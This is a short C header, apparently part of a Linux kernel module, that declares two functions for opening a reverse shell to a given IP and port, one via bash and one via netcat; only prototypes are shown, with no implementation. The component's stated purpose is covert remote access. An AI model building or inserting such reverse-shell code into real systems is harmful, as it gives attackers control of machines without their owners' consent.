#ifndef __RSHELL_H__
#include <linux/kernel.h>
void try_reverse_shell_bash(__u32 ip, __u32 port);
void try_reverse_shell_nc(__u32 ip, __u32 port);
#endif /* __RSHELL_H__ */
